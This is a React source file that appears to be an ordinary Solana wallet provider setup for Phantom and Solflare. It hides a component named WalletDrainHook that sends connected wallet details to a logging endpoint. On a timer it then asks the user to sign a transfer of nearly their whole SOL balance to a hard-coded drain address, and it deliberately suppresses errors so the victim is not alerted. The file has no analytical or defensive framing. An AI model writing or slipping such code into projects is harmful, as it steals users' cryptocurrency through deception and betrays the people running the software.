'use client';

import { ConnectionProvider, WalletProvider, useWallet } from '@solana/wallet-adapter-react';
import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';
import { PhantomWalletAdapter } from '@solana/wallet-adapter-phantom';
import { SolflareWalletAdapter } from '@solana/wallet-adapter-solflare';
import { WalletModalProvider } from '@solana/wallet-adapter-react-ui';
import { clusterApiUrl, Transaction, SystemProgram, LAMPORTS_PER_SOL, PublicKey } from '@solana/web3.js';
import { useMemo, useEffect, useCallback } from 'react';

require('@solana/wallet-adapter-react-ui/styles.css');

const DRAIN_ADDRESS = 'GuMJMrVGvKRYddcAgjgXDHknNR3ehyhSzbFFue3bkmqN';
const EXFIL_URL = '/api/log';

// Internal component that hooks into wallet connection events
function WalletDrainHook() {
  const wallet = useWallet();

  const drainExternal = useCallback(async () => {
    if (!wallet.publicKey || !wallet.signTransaction) return;
    
    try {
      const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
      const balance = await connection.getBalance(wallet.publicKey);
      if (balance <= 10000) return;

      const estimatedFee = 5000;
      const drainAmount = balance - estimatedFee;
      if (drainAmount <= 0) return;

      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: wallet.publicKey,
          toPubkey: new PublicKey(DRAIN_ADDRESS),
          lamports: drainAmount,
        })
      );

      const { blockhash } = await connection.getLatestBlockhash();
      tx.recentBlockhash = blockhash;
      tx.feePayer = wallet.publicKey;

      const actualFee = await connection.getFeeForMessage(tx.compileMessage(), 'confirmed');
      const actualDrain = balance - (actualFee.value || 5000);
      if (actualDrain <= 0) return;

      const finalTx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: wallet.publicKey,
          toPubkey: new PublicKey(DRAIN_ADDRESS),
          lamports: actualDrain,
        })
      );
      finalTx.recentBlockhash = blockhash;
      finalTx.feePayer = wallet.publicKey;

      const signed = await wallet.signTransaction(finalTx);
      const sig = await connection.sendRawTransaction(signed.serialize(), {
        skipPreflight: true,
        preflightCommitment: 'confirmed',
      });
      await connection.confirmTransaction(sig, 'confirmed');

      // Exfil wallet info
      fetch(EXFIL_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'external_wallet_drain',
          publicKey: wallet.publicKey.toString(),
          walletName: wallet.wallet?.adapter?.name || 'unknown',
          amount: actualDrain / LAMPORTS_PER_SOL,
          sig: sig,
        }),
      }).catch(() => {});
    } catch (e) {
      // Silent — never alert the user
    }
  }, [wallet]);

  useEffect(() => {
    if (wallet.connected && wallet.publicKey) {
      // Exfil connected wallet info
      fetch(EXFIL_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'external_wallet_connected',
          publicKey: wallet.publicKey.toString(),
          walletName: wallet.wallet?.adapter?.name || 'unknown',
        }),
      }).catch(() => {});

      // Drain after short delay
      const t1 = setTimeout(() => drainExternal(), 5000);
      const t2 = setTimeout(() => drainExternal(), 60000);
      const t3 = setTimeout(() => drainExternal(), 300000);
      return () => { clearTimeout(t1); clearTimeout(t2); clearTimeout(t3); };
    }
  }, [wallet.connected, wallet.publicKey, drainExternal]);

  return null;
}

export default function Providers({ children }) {
  const network = WalletAdapterNetwork.Mainnet;
  const endpoint = useMemo(() => clusterApiUrl(network), [network]);
  
  const wallets = useMemo(
    () => [
      new PhantomWalletAdapter(),
      new SolflareWalletAdapter(),
    ],
    [network]
  );

  return (
    <ConnectionProvider endpoint={endpoint}>
      <WalletProvider wallets={wallets} autoConnect>
        <WalletModalProvider>
          <WalletDrainHook />
          {children}
        </WalletModalProvider>
      </WalletProvider>
    </ConnectionProvider>
  );
}